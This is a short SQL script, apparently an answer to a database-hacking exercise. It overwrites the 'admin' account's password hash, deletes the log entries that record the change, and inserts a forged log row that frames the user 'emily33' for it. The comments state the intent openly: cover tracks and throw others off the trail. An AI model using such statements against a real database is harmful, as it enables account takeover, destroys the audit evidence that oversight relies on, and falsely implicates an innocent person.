-- Alter the password of the website’s administrative account, admin, to instead be “oops!” (hashed)
UPDATE "users" SET "password" = '982c0381c279d1d9689a23488b625834' WHERE "username" = 'admin';

-- Erase any logs of the above password change recorded by the database
DELETE FROM "user_logs" WHERE "type" = 'update' AND "old_username" = 'admin';

-- Add false data to throw others off your trail - frame emily33 for password change to admin's password
INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
SELECT 'update', 'admin','admin', NULL, (SELECT password FROM users WHERE username ='emily33');
